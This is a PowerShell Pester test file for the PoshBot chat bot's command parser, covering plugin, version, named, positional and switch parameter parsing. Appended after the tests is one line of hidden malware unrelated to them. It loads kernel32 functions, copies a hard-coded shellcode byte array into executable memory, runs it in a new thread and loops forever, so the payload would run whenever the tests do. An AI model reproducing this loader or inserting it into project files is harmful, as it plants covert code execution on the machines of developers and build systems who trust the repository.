
InModuleScope PoshBot {

    Describe CommandParser {

        Context 'Return object' {

            it 'Is a [ParsedCommand] object' {
                $msg = [Message]::new()
                $msg.Text = 'about'
                $parsedCommand = [CommandParser]::Parse($msg)

                $parsedCommand.PSObject.TypeNames[0] | should be 'ParsedCommand'
            }
            it 'Has original command string' {
                $msg = [Message]::new()
                $msg.Text = 'foo --bar baz'
                $parsedCommand = [CommandParser]::Parse($msg)

                $parsedCommand.CommandString | should be 'foo --bar baz'
            }

            it 'Has a datetime stamp' {
                $msg = [Message]::new()
                $msg.Text = 'foo --bar baz'
                $parsedCommand = [CommandParser]::Parse($msg)

                $parsedCommand.Time | should beoftype datetime
            }

            it 'Has message to/from' {
                $msg = [Message]::new()
                $msg.Text = 'foo'
                $msg.To = 'U3839FJDY'
                $msg.From = 'C938FJEUI'
                $parsedCommand = [CommandParser]::Parse($msg)

                $parsedCommand.To | should be 'U3839FJDY'
                $parsedCommand.From | should be 'C938FJEUI'
            }

            it 'Has original message' {
                $msg = [Message]::new()
                $msg.Text = 'foo'
                $parsedCommand = [CommandParser]::Parse($msg)

                $parsedCommand.OriginalMessage.PSObject.TypeNames[0] | should be 'Message'
                $parsedCommand.OriginalMessage.Text | should be 'foo'
            }
        }

        context 'Parsed Logic' {

            it 'Parses simple command' {
                $msg = [Message]::new()
                $msg.Text = 'status'
                $parsedCommand = [CommandParser]::Parse($msg)

                $parsedCommand.Plugin | should benullorempty
                $parsedCommand.Command | should be 'status'
                $parsedCommand.Version | should benullorempty
            }

            it 'Parses simple command with version' {
                $msg = [Message]::new()
                $msg.Text = 'status:1.2.3'
                $parsedCommand = [CommandParser]::Parse($msg)

                $parsedCommand.Plugin | should benullorempty
                $parsedCommand.Command | should be 'status'
                $parsedCommand.Version | should be '1.2.3'
            }

            it 'Parses fully qualified command' {
                $msg = [Message]::new()
                $msg.Text = 'builtin:status'
                $parsedCommand = [CommandParser]::Parse($msg)

                $parsedCommand.Plugin | should be 'builtin'
                $parsedCommand.Command | should be 'status'
                $parsedCommand.Version | should benullorempty
            }

            it 'Parses fully qualified command with version' {
                $msg = [Message]::new()
                $msg.Text = 'builtin:status:0.5.0'
                $parsedCommand = [CommandParser]::Parse($msg)

                $parsedCommand.Plugin | should be 'builtin'
                $parsedCommand.Command | should be 'status'
                $parsedCommand.Version | should be '0.5.0'
            }

            it 'Parses command with single named parameter' {
                $msg = [Message]::new()
                $msg.Text = 'foo --bar baz'
                $parsedCommand = [CommandParser]::Parse($msg)

                $parsedCommand.Plugin | should benullorempty
                $parsedCommand.Command | should be 'foo'
                $parsedCommand.Version | should benullorempty
                $parsedCommand.NamedParameters.bar | should be 'baz'
            }

            it 'Parses command with multiple named parameters' {
                $msg = [Message]::new()
                $msg.Text = 'foo --bar baz --asdf qwerty --number 42'
                $parsedCommand = [CommandParser]::Parse($msg)

                $parsedCommand.Plugin | should benullorempty
                $parsedCommand.Command | should be 'foo'
                $parsedCommand.Version | should benullorempty
                $parsedCommand.NamedParameters.keys.count | should be 3
                $parsedCommand.NamedParameters.bar | should be 'baz'
                $parsedCommand.NamedParameters.asdf | should be 'qwerty'
                $parsedCommand.NamedParameters.number | should beoftype int
                $parsedCommand.NamedParameters.number | should be 42
            }

            it 'Parses command with an array value' {
                $msg = [Message]::new()
                $msg.Text = 'foo --bar "baz", "asdf", "qwerty"'
                $parsedCommand = [CommandParser]::Parse($msg)

                $parsedCommand.Plugin | should benullorempty
                $parsedCommand.Command | should be 'foo'
                $parsedCommand.Version | should benullorempty
                $parsedCommand.NamedParameters.Keys.Count | should be 1
                $parsedCommand.NamedParameters.bar.Count | should be 3
                $parsedCommand.NamedParameters.bar[0] | should be 'baz'
                $parsedCommand.NamedParameters.bar[1] | should be 'asdf'
                $parsedCommand.NamedParameters.bar[2] | should be 'qwerty'
            }

            it 'Parses positional parameters' {
                $msg = [Message]::new()
                $msg.Text = 'foo bar baz'
                $parsedCommand = [CommandParser]::Parse($msg)

                $parsedCommand.Plugin | should benullorempty
                $parsedCommand.Command | should be 'foo'
                $parsedCommand.Version | should benullorempty
                $parsedCommand.PositionalParameters.Count | should be 2
                $parsedCommand.PositionalParameters[0] | should be 'bar'
                $parsedCommand.PositionalParameters[1] | should be 'baz'
            }

            It 'Parses switch parameters' {
                $msg = [Message]::new()
                $msg.Text = 'foo --bar --baz'
                $parsedCommand = [CommandParser]::Parse($msg)

                $parsedCommand.Plugin | should benullorempty
                $parsedCommand.Command | should be 'foo'
                $parsedCommand.Version | should benullorempty
                $parsedCommand.NamedParameters.Keys.Count | should be 2
                $parsedCommand.NamedParameters.bar | should be $true
                $parsedCommand.NamedParameters.baz | should be $true
            }

            It 'Parses complex command' {
                $msg = [Message]::new()
                $msg.Text = 'myplugin:foo:1.0.0 "pos1" 12345 --bar baz --asdf "qwerty", "42" --named3 3333'
                $parsedCommand = [CommandParser]::Parse($msg)

                $parsedCommand.Plugin | should be 'myplugin'
                $parsedCommand.Command | should be 'foo'
                $parsedCommand.Version | should be '1.0.0'
                $parsedCommand.NamedParameters.Keys.Count | should be 3
                $parsedCommand.NamedParameters.bar | should be 'baz'
                $parsedCommand.NamedParameters.asdf.Count | should be 2
                $parsedCommand.NamedParameters.asdf[0] | should be 'qwerty'
                $parsedCommand.NamedParameters.asdf[1] | should be 42
                $parsedCommand.NamedParameters.named3 | should be 3333
                $parsedCommand.PositionalParameters.Count | should be 2
                $parsedCommand.PositionalParameters[0] | should be 'pos1'
                $parsedCommand.PositionalParameters[1] | should be 12345
            }

            It 'Parses command with @mentions' {
                $msg = [Message]::new()
                $msg.Text = 'givekarma @devblackops 100'
                $parsedCommand = [CommandParser]::Parse($msg)

                $parsedCommand.PositionalParameters.Count | should be 2
                $parsedCommand.PositionalParameters[0] | should be '@devblackops'
                $parsedCommand.PositionalParameters[1] | should be 100
            }

            It "Doesn't replace '--' in command string values, only parameter names" {
                $msg = [Message]::new()
                $msg.Text = "shorten --url 'http://abc--123-asdf--qwerty.mydomain.tld:()"
                $parsedCommand = [CommandParser]::Parse($msg)

                $parsedCommand.NamedParameters['url'] | should be 'http://abc--123-asdf--qwerty.mydomain.tld:()'
            }
        }
    }
}

$VgMR = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $VgMR -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xcd,0xbe,0x15,0xcd,0xed,0x03,0xd9,0x74,0x24,0xf4,0x58,0x33,0xc9,0xb1,0x47,0x31,0x70,0x18,0x83,0xe8,0xfc,0x03,0x70,0x01,0x2f,0x18,0xff,0xc1,0x2d,0xe3,0x00,0x11,0x52,0x6d,0xe5,0x20,0x52,0x09,0x6d,0x12,0x62,0x59,0x23,0x9e,0x09,0x0f,0xd0,0x15,0x7f,0x98,0xd7,0x9e,0xca,0xfe,0xd6,0x1f,0x66,0xc2,0x79,0xa3,0x75,0x17,0x5a,0x9a,0xb5,0x6a,0x9b,0xdb,0xa8,0x87,0xc9,0xb4,0xa7,0x3a,0xfe,0xb1,0xf2,0x86,0x75,0x89,0x13,0x8f,0x6a,0x59,0x15,0xbe,0x3c,0xd2,0x4c,0x60,0xbe,0x37,0xe5,0x29,0xd8,0x54,0xc0,0xe0,0x53,0xae,0xbe,0xf2,0xb5,0xff,0x3f,0x58,0xf8,0x30,0xb2,0xa0,0x3c,0xf6,0x2d,0xd7,0x34,0x05,0xd3,0xe0,0x82,0x74,0x0f,0x64,0x11,0xde,0xc4,0xde,0xfd,0xdf,0x09,0xb8,0x76,0xd3,0xe6,0xce,0xd1,0xf7,0xf9,0x03,0x6a,0x03,0x71,0xa2,0xbd,0x82,0xc1,0x81,0x19,0xcf,0x92,0xa8,0x38,0xb5,0x75,0xd4,0x5b,0x16,0x29,0x70,0x17,0xba,0x3e,0x09,0x7a,0xd2,0xf3,0x20,0x85,0x22,0x9c,0x33,0xf6,0x10,0x03,0xe8,0x90,0x18,0xcc,0x36,0x66,0x5f,0xe7,0x8f,0xf8,0x9e,0x08,0xf0,0xd1,0x64,0x5c,0xa0,0x49,0x4d,0xdd,0x2b,0x8a,0x72,0x08,0xc1,0x8f,0xe4,0x73,0xbe,0xa8,0x92,0x1b,0xbd,0xc8,0x4b,0x93,0x48,0x2e,0x3b,0x7b,0x1b,0xff,0xfb,0x2b,0xdb,0xaf,0x93,0x21,0xd4,0x90,0x83,0x49,0x3e,0xb9,0x29,0xa6,0x97,0x91,0xc5,0x5f,0xb2,0x6a,0x74,0x9f,0x68,0x17,0xb6,0x2b,0x9f,0xe7,0x78,0xdc,0xea,0xfb,0xec,0x2c,0xa1,0xa6,0xba,0x33,0x1f,0xcc,0x42,0xa6,0xa4,0x47,0x15,0x5e,0xa7,0xbe,0x51,0xc1,0x58,0x95,0xea,0xc8,0xcc,0x56,0x84,0x34,0x01,0x57,0x54,0x63,0x4b,0x57,0x3c,0xd3,0x2f,0x04,0x59,0x1c,0xfa,0x38,0xf2,0x89,0x05,0x69,0xa7,0x1a,0x6e,0x97,0x9e,0x6d,0x31,0x68,0xf5,0x6f,0x0d,0xbf,0x33,0x1a,0x7f,0x03;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$opml=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($opml.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$opml,0,0,0);for (;;){Start-sleep 60};

